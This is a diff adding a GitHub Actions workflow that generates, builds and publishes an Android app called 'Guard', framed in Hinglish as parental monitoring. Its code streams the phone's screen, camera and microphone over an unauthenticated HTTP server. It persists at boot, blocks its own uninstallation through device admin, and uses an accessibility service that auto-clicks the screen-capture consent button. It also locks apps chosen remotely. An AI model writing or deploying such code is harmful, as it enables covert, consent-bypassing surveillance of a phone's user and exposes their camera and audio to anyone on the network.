@@ -1,0 +1,613 @@
+name: build
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+      - uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: '8.7'
+      - name: make files
+        run: |
+          mkdir -p app/src/main/java/com/guard/app app/src/main/res/xml
+          cat > settings.gradle.kts <<'EOF'
+          pluginManagement {
+              repositories { google(); mavenCentral(); gradlePluginPortal() }
+          }
+          dependencyResolutionManagement {
+              repositories { google(); mavenCentral() }
+          }
+          rootProject.name = "Guard"
+          include(":app")
+          EOF
+          cat > build.gradle.kts <<'EOF'
+          plugins {
+              id("com.android.application") version "8.4.0" apply false
+              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
+          }
+          EOF
+          cat > gradle.properties <<'EOF'
+          android.useAndroidX=true
+          org.gradle.jvmargs=-Xmx3g
+          EOF
+          cat > app/build.gradle.kts <<'EOF'
+          plugins {
+              id("com.android.application")
+              id("org.jetbrains.kotlin.android")
+          }
+          android {
+              namespace = "com.guard.app"
+              compileSdk = 34
+              defaultConfig {
+                  applicationId = "com.guard.app"
+                  minSdk = 26
+                  targetSdk = 34
+                  versionCode = 1
+                  versionName = "1.0"
+              }
+              compileOptions {
+                  sourceCompatibility = JavaVersion.VERSION_17
+                  targetCompatibility = JavaVersion.VERSION_17
+              }
+              kotlinOptions { jvmTarget = "17" }
+          }
+          dependencies {
+              implementation("androidx.appcompat:appcompat:1.6.1")
+              implementation("androidx.core:core-ktx:1.13.1")
+              implementation("org.nanohttpd:nanohttpd:2.3.1")
+              implementation("androidx.camera:camera-core:1.3.4")
+              implementation("androidx.camera:camera-camera2:1.3.4")
+              implementation("androidx.camera:camera-lifecycle:1.3.4")
+          }
+          EOF
+          cat > app/src/main/res/xml/access_cfg.xml <<'EOF'
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeWindowStateChanged"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:canRetrieveWindowContent="true"
+              android:notificationTimeout="100"/>
+          EOF
+          cat > app/src/main/res/xml/admin_cfg.xml <<'EOF'
+          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+            <uses-policies><limit-password/><watch-login/><force-lock/></uses-policies>
+          </device-admin>
+          EOF
+          cat > app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
+            <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+            <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+            <application android:label="Guard" android:usesCleartextTraffic="true"
+                android:theme="@style/Theme.AppCompat.DayNight.NoActionBar">
+              <activity android:name=".MainActivity" android:exported="true"/>
+              <activity android:name=".ViewerActivity" android:exported="false"/>
+              <activity android:name=".LockScreen" android:exported="false"
+                  android:excludeFromRecents="true" android:showWhenLocked="true"/>
+              <activity-alias android:name=".MainAlias" android:targetActivity=".MainActivity"
+                  android:exported="true">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
+              <service android:name=".CoreService" android:exported="false"
+                  android:foregroundServiceType="mediaProjection|camera|microphone"/>
+              <service android:name=".LockWatcher" android:exported="true"
+                  android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+                <intent-filter>
+                  <action android:name="android.accessibilityservice.AccessibilityService"/>
+                </intent-filter>
+                <meta-data android:name="android.accessibilityservice"
+                    android:resource="@xml/access_cfg"/>
+              </service>
+              <receiver android:name=".AdminReceiver" android:exported="true"
+                  android:permission="android.permission.BIND_DEVICE_ADMIN">
+                <meta-data android:name="android.app.device_admin" android:resource="@xml/admin_cfg"/>
+                <intent-filter>
+                  <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                </intent-filter>
+              </receiver>
+              <receiver android:name=".Boot" android:exported="true">
+                <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
+              </receiver>
+            </application>
+          </manifest>
+          EOF
+          cat > app/src/main/java/com/guard/app/AdminReceiver.kt <<'EOF'
+          package com.guard.app
+          import android.app.admin.DeviceAdminReceiver
+          class AdminReceiver : DeviceAdminReceiver()
+          EOF
+          cat > app/src/main/java/com/guard/app/Boot.kt <<'EOF'
+          package com.guard.app
+          import android.content.BroadcastReceiver
+          import android.content.Context
+          import android.content.Intent
+          class Boot : BroadcastReceiver() {
+              override fun onReceive(c: Context, i: Intent) {
+                  if (c.getSharedPreferences("g", 0).getBoolean("child", false))
+                      c.startForegroundService(Intent(c, CoreService::class.java))
+              }
+          }
+          EOF
+          cat > app/src/main/java/com/guard/app/LockScreen.kt <<'EOF'
+          package com.guard.app
+          import android.app.Activity
+          import android.content.Intent
+          import android.os.Bundle
+          import android.widget.Button
+          import android.widget.LinearLayout
+          import android.widget.TextView
+          class LockScreen : Activity() {
+              override fun onCreate(b: Bundle?) {
+                  super.onCreate(b)
+                  val l = LinearLayout(this)
+                  l.orientation = LinearLayout.VERTICAL
+                  l.setPadding(60, 400, 60, 0)
+                  l.setBackgroundColor(0xFF111111.toInt())
+                  l.addView(TextView(this).apply {
+                      text = "Yeh app abhi band hai"
+                      setTextColor(0xFFFFFFFF.toInt())
+                      textSize = 22f
+                  })
+                  l.addView(Button(this).apply {
+                      text = "Home"
+                      setOnClickListener { goHome() }
+                  })
+                  setContentView(l)
+              }
+              private fun goHome() {
+                  startActivity(Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME)
+                      .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+                  finish()
+              }
+              override fun onBackPressed() { goHome() }
+          }
+          EOF
+          cat > app/src/main/java/com/guard/app/LockWatcher.kt <<'EOF'
+          package com.guard.app
+          import android.accessibilityservice.AccessibilityService
+          import android.content.Intent
+          import android.view.accessibility.AccessibilityEvent
+          import android.view.accessibility.AccessibilityNodeInfo
+          class LockWatcher : AccessibilityService() {
+              override fun onAccessibilityEvent(e: AccessibilityEvent) {
+                  if (e.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
+                  val root = rootInActiveWindow
+                  if (root != null) {
+                      scan(root, "Start now")
+                      scan(root, "Ab shuru karein")
+                  }
+                  val pkg = e.packageName?.toString() ?: return
+                  if (pkg == packageName) return
+                  val locked = getSharedPreferences("g", 0).getStringSet("locked", emptySet()) ?: emptySet()
+                  if (locked.contains(pkg)) {
+                      performGlobalAction(GLOBAL_ACTION_HOME)
+                      startActivity(Intent(this, LockScreen::class.java)
+                          .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP))
+                  }
+              }
+              private fun scan(n: AccessibilityNodeInfo, t: String) {
+                  if (n.text?.toString() == t) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
+                  for (i in 0 until n.childCount) n.getChild(i)?.let { scan(it, t) }
+              }
+              override fun onInterrupt() {}
+          }
+          EOF
+          cat > app/src/main/java/com/guard/app/CoreService.kt <<'EOF'
+          package com.guard.app
+          import android.app.*
+          import android.content.Intent
+          import android.content.pm.ServiceInfo
+          import android.graphics.Bitmap
+          import android.graphics.PixelFormat
+          import android.hardware.display.DisplayManager
+          import android.hardware.display.VirtualDisplay
+          import android.media.*
+          import android.media.projection.MediaProjection
+          import android.media.projection.MediaProjectionManager
+          import android.os.*
+          import androidx.camera.core.*
+          import androidx.lifecycle.Lifecycle
+          import androidx.lifecycle.LifecycleOwner
+          import androidx.lifecycle.LifecycleRegistry
+          import fi.iki.elonen.NanoHTTPD
+          import java.io.ByteArrayOutputStream
+          import java.util.concurrent.Executors
+
+          class CoreService : Service() {
+              @Volatile var screenJpg: ByteArray? = null
+              @Volatile var camJpg: ByteArray? = null
+              @Volatile var micOn = false
+              private var pcm = ByteArray(0)
+              private val exec = Executors.newSingleThreadExecutor()
+              private val main = Handler(Looper.getMainLooper())
+              private var server: Srv? = null
+              private var proj: MediaProjection? = null
+              private var vd: VirtualDisplay? = null
+              private var camProv: ProcessCameraProvider? = null
+              private var rec: AudioRecord? = null
+              private val owner = object : LifecycleOwner {
+                  val reg = LifecycleRegistry(this)
+                  override val lifecycle: Lifecycle get() = reg
+              }
+
+              override fun onBind(i: Intent?) = null
+
+              override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
+                  try {
+                      if (Build.VERSION.SDK_INT >= 29)
+                          startForeground(1, notif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
+                              ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+                              ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
+                      else startForeground(1, notif())
+                  } catch (e: Exception) { startForeground(1, notif()) }
+                  i?.getParcelableExtra<Intent>("data")?.let { startScreen(it) }
+                  if (server == null) {
+                      server = Srv(8080).also { it.start(NanoHTTPD.SOCKET_READ_TIMEOUT, false) }
+                  }
+                  return START_STICKY
+              }
+
+              private fun notif(): Notification {
+                  getSystemService(NotificationManager::class.java)
+                      .createNotificationChannel(NotificationChannel("g", "Guard", NotificationManager.IMPORTANCE_MIN))
+                  return Notification.Builder(this, "g")
+                      .setContentTitle("Guard").setSmallIcon(android.R.drawable.ic_menu_view).build()
+              }
+
+              private fun startScreen(data: Intent) {
+                  val mpm = getSystemService(MediaProjectionManager::class.java)
+                  val p = mpm.getMediaProjection(Activity.RESULT_OK, data) ?: return
+                  proj = p
+                  p.registerCallback(object : MediaProjection.Callback() {
+                      override fun onStop() { vd?.release() }
+                  }, main)
+                  val dm = resources.displayMetrics
+                  val w = 480
+                  val h = (dm.heightPixels.toLong() * 480 / dm.widthPixels).toInt()
+                  val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
+                  vd = p.createVirtualDisplay("s", w, h, dm.densityDpi,
+                      DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
+                  reader.setOnImageAvailableListener({ r ->
+                      val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+                      try {
+                          val pl = img.planes[0]
+                          val stride = pl.rowStride / pl.pixelStride
+                          val full = Bitmap.createBitmap(stride, img.height, Bitmap.Config.ARGB_8888)
+                          full.copyPixelsFromBuffer(pl.buffer)
+                          val bmp = Bitmap.createBitmap(full, 0, 0, minOf(w, stride), img.height)
+                          val o = ByteArrayOutputStream()
+                          bmp.compress(Bitmap.CompressFormat.JPEG, 45, o)
+                          screenJpg = o.toByteArray()
+                      } catch (e: Exception) {
+                      } finally { img.close() }
+                  }, main)
+              }
+
+              fun startCam(facing: Int) {
+                  main.post {
+                      val fut = ProcessCameraProvider.getInstance(this)
+                      fut.addListener({
+                          runCatching {
+                              val cp = fut.get()
+                              camProv = cp
+                              val an = ImageAnalysis.Builder()
+                                  .setTargetResolution(android.util.Size(640, 480))
+                                  .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_JPEG)
+                                  .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                                  .build()
+                              an.setAnalyzer(exec) { px ->
+                                  runCatching {
+                                      val b = px.planes[0].buffer
+                                      val arr = ByteArray(b.remaining())
+                                      b.get(arr)
+                                      camJpg = arr
+                                  }
+                                  px.close()
+                              }
+                              val sel = CameraSelector.Builder().requireLensFacing(facing).build()
+                              owner.reg.currentState = Lifecycle.State.RESUMED
+                              cp.unbindAll()
+                              cp.bindToLifecycle(owner, sel, an)
+                          }
+                      }, main)
+                  }
+              }
+
+              fun stopCam() {
+                  main.post { runCatching { camProv?.unbindAll() }; camJpg = null }
+              }
+
+              fun startMic() {
+                  if (micOn) return
+                  micOn = true
+                  exec.execute {
+                      runCatching {
+                          val r = AudioRecord(MediaRecorder.AudioSource.MIC, 16000,
+                              AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, 16000)
+                          rec = r
+                          r.startRecording()
+                          val buf = ByteArray(3200)
+                          while (micOn) {
+                              val n = r.read(buf, 0, buf.size)
+                              if (n > 0) synchronized(pcm) {
+                                  val all = pcm + buf.copyOf(n)
+                                  pcm = if (all.size > 48000) all.copyOfRange(all.size - 48000, all.size) else all
+                              }
+                          }
+                          r.stop(); r.release()
+                      }
+                  }
+              }
+
+              fun stopMic() { micOn = false }
+
+              inner class Srv(p: Int) : NanoHTTPD(p) {
+                  override fun serve(s: Session): Response {
+                      return when (s.uri) {
+                          "/f" -> jpg(screenJpg)
+                          "/c" -> jpg(camJpg)
+                          "/m" -> {
+                              val copy = synchronized(pcm) { pcm.copyOf() }
+                              newFixedLengthResponse(Response.Status.OK, "audio/raw",
+                                  copy.inputStream(), copy.size.toLong())
+                          }
+                          "/cmd" -> {
+                              when (s.parms["c"]) {
+                                  "front" -> startCam(CameraSelector.LENS_FACING_FRONT)
+                                  "back" -> startCam(CameraSelector.LENS_FACING_BACK)
+                                  "camoff" -> stopCam()
+                                  "micon" -> startMic()
+                                  "micoff" -> stopMic()
+                                  "lock" -> s.parms["p"]?.let { addLock(it) }
+                                  "unlock" -> s.parms["p"]?.let { delLock(it) }
+                              }
+                              newFixedLengthResponse("ok")
+                          }
+                          "/info" -> newFixedLengthResponse(Build.MODEL)
+                          else -> newFixedLengthResponse("guard")
+                      }
+                  }
+                  private fun jpg(b: ByteArray?): Response =
+                      if (b == null) newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "none")
+                      else newFixedLengthResponse(Response.Status.OK, "image/jpeg", b.inputStream(), b.size.toLong())
+              }
+
+              private fun addLock(p: String) {
+                  val sp = getSharedPreferences("g", 0)
+                  sp.edit().putStringSet("locked", (sp.getStringSet("locked", emptySet()) ?: emptySet()) + p).apply()
+              }
+              private fun delLock(p: String) {
+                  val sp = getSharedPreferences("g", 0)
+                  sp.edit().putStringSet("locked", (sp.getStringSet("locked", emptySet()) ?: emptySet()) - p).apply()
+              }
+
+              override fun onDestroy() {
+                  runCatching { server?.stop() }
+                  stopMic(); stopCam()
+                  runCatching { vd?.release() }
+                  runCatching { proj?.stop() }
+                  super.onDestroy()
+              }
+          }
+          EOF
+          cat > app/src/main/java/com/guard/app/MainActivity.kt <<'EOF'
+          package com.guard.app
+          import android.app.Activity
+          import android.app.admin.DevicePolicyManager
+          import android.content.ComponentName
+          import android.content.Intent
+          import android.media.projection.MediaProjectionManager
+          import android.os.Bundle
+          import android.widget.*
+          class MainActivity : Activity() {
+              override fun onCreate(b: Bundle?) {
+                  super.onCreate(b)
+                  if (getSharedPreferences("g", 0).getBoolean("child", false)) childUi() else parentUi()
+              }
+              private fun parentUi() {
+                  val sp = getSharedPreferences("g", 0)
+                  val l = LinearLayout(this)
+                  l.orientation = LinearLayout.VERTICAL
+                  l.setPadding(40, 80, 40, 40)
+                  l.addView(Button(this).apply {
+                      text = "Ye bachche ka phone hai"
+                      setOnClickListener { sp.edit().putBoolean("child", true).apply(); childUi() }
+                  })
+                  val nm = EditText(this).apply { hint = "Naam" }
+                  val ip = EditText(this).apply { hint = "100.x.x.x" }
+                  l.addView(nm); l.addView(ip)
+                  l.addView(Button(this).apply {
+                      text = "Device add karo"
+                      setOnClickListener {
+                          val s = (sp.getStringSet("devs", emptySet()) ?: emptySet()).toMutableSet()
+                          s.add(nm.text.toString() + "|" + ip.text.toString())
+                          sp.edit().putStringSet("devs", s).apply()
+                          nm.text.clear(); ip.text.clear(); parentUi()
+                      }
+                  })
+                  for (d in (sp.getStringSet("devs", emptySet()) ?: emptySet())) {
+                      val parts = d.split("|")
+                      l.addView(Button(this).apply {
+                          text = parts[0]
+                          setOnClickListener {
+                              startActivity(Intent(this@MainActivity, ViewerActivity::class.java)
+                                  .putExtra("ip", parts.getOrElse(1) { "" }))
+                          }
+                      })
+                  }
+                  setContentView(l)
+              }
+              private fun childUi() {
+                  val l = LinearLayout(this)
+                  l.orientation = LinearLayout.VERTICAL
+                  l.setPadding(40, 80, 40, 40)
+                  l.addView(TextView(this).apply { text = "Child mode ON" })
+                  l.addView(Button(this).apply {
+                      text = "1. Permissions do"
+                      setOnClickListener {
+                          requestPermissions(arrayOf(android.Manifest.permission.CAMERA,
+                              android.Manifest.permission.RECORD_AUDIO,
+                              android.Manifest.permission.POST_NOTIFICATIONS), 1)
+                          startActivity(Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION))
+                      }
+                  })
+                  l.addView(Button(this).apply {
+                      text = "2. Device Admin on"
+                      setOnClickListener {
+                          val cn = ComponentName(this@MainActivity, AdminReceiver::class.java)
+                          runCatching {
+                              getSystemService(DevicePolicyManager::class.java)
+                                  .setUninstallBlocked(cn, packageName, true)
+                          }
+                          startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                              .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn))
+                      }
+                  })
+                  l.addView(Button(this).apply {
+                      text = "3. Screen sharing chalu karo"
+                      setOnClickListener {
+                          startActivityForResult(getSystemService(MediaProjectionManager::class.java)
+                              .createScreenCaptureIntent(), 9)
+                      }
+                  })
+                  l.addView(TextView(this).apply { text = "Parent phone se connect hone ke liye Tailscale on rakho" })
+                  setContentView(l)
+              }
+              override fun onActivityResult(r: Int, c: Int, d: Intent?) {
+                  super.onActivityResult(r, c, d)
+                  if (r == 9 && c == RESULT_OK && d != null) {
+                      startForegroundService(Intent(this, CoreService::class.java).putExtra("data", d))
+                      Toast.makeText(this, "Chalu ho gaya", Toast.LENGTH_LONG).show()
+                  }
+              }
+          }
+          EOF
+          cat > app/src/main/java/com/guard/app/ViewerActivity.kt <<'EOF'
+          package com.guard.app
+          import android.app.Activity
+          import android.graphics.BitmapFactory
+          import android.media.AudioAttributes
+          import android.media.AudioFormat
+          import android.media.AudioTrack
+          import android.os.Bundle
+          import android.os.Handler
+          import android.os.Looper
+          import android.widget.*
+          import java.net.URL
+          import java.util.concurrent.Executors
+          class ViewerActivity : Activity() {
+              private var ip = ""
+              private var cam = false
+              private var micOn = false
+              private var track: AudioTrack? = null
+              private val h = Handler(Looper.getMainLooper())
+              private val ex = Executors.newFixedThreadPool(3)
+              private lateinit var img: ImageView
+              override fun onCreate(b: Bundle?) {
+                  super.onCreate(b)
+                  ip = intent.getStringExtra("ip") ?: ""
+                  val l = LinearLayout(this)
+                  l.orientation = LinearLayout.VERTICAL
+                  img = ImageView(this)
+                  l.addView(img, LinearLayout.LayoutParams(-1, 800))
+                  val r1 = LinearLayout(this)
+                  fun b(t: String, f: () -> Unit) {
+                      r1.addView(Button(this).apply { text = t; setOnClickListener { f() } })
+                  }
+                  b("Front") { cmd("front"); cam = true }
+                  b("Back") { cmd("back"); cam = true }
+                  b("Cam off") { cmd("camoff"); cam = false }
+                  b("Mic") { if (micOn) stopMic() else startMic() }
+                  l.addView(r1)
+                  val r2 = LinearLayout(this)
+                  val pk = EditText(this).apply { hint = "com.whatsapp" }
+                  r2.addView(pk)
+                  r2.addView(Button(this).apply { text = "Lock"; setOnClickListener { cmd("lock&p=" + pk.text) } })
+                  r2.addView(Button(this).apply { text = "Unlock"; setOnClickListener { cmd("unlock&p=" + pk.text) } })
+                  l.addView(r2)
+                  setContentView(l)
+                  loop()
+              }
+              private fun loop() {
+                  h.postDelayed({
+                      ex.execute {
+                          runCatching {
+                              val d = URL("http://" + ip + "/" + (if (cam) "c" else "f")).readBytes()
+                              val bmp = BitmapFactory.decodeByteArray(d, 0, d.size)
+                              h.post { if (bmp != null) img.setImageBitmap(bmp) }
+                          }
+                      }
+                      loop()
+                  }, 500)
+              }
+              private fun cmd(c: String) {
+                  ex.execute { runCatching { URL("http://" + ip + "/cmd?c=" + c).readText() } }
+              }
+              private fun startMic() {
+                  micOn = true
+                  cmd("micon")
+                  val buf = AudioTrack.getMinBufferSize(16000, AudioFormat.CHANNEL_OUT_MONO,
+                      AudioFormat.ENCODING_PCM_16BIT)
+                  track = AudioTrack.Builder()
+                      .setAudioAttributes(AudioAttributes.Builder()
+                          .setUsage(AudioAttributes.USAGE_MEDIA)
+                          .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH).build())
+                      .setAudioFormat(AudioFormat.Builder()
+                          .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
+                          .setSampleRate(16000)
+                          .setChannelMask(AudioFormat.CHANNEL_OUT_MONO).build())
+                      .setBufferSizeInBytes(maxOf(buf, 6400) * 2)
+                      .setTransferMode(AudioTrack.MODE_STREAM).build()
+                  track?.play()
+                  Thread {
+                      while (micOn) {
+                          runCatching {
+                              val d = URL("http://" + ip + "/m").readBytes()
+                              if (d.isNotEmpty()) track?.write(d, 0, d.size)
+                          }
+                      }
+                  }.start()
+              }
+              private fun stopMic() {
+                  micOn = false
+                  cmd("micoff")
+                  runCatching { track?.pause(); track?.flush(); track?.release() }
+                  track = null
+              }
+              override fun onDestroy() {
+                  if (micOn) stopMic()
+                  h.removeCallbacksAndMessages(null)
+                  ex.shutdown()
+                  super.onDestroy()
+              }
+          }
+          EOF
+          echo done
+      - name: build
+        run: gradle assembleDebug --no-daemon
+      - name: publish
+        if: success()
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: v1
+          name: Guard APK
+          files: app/build/outputs/apk/debug/app-debug.apk
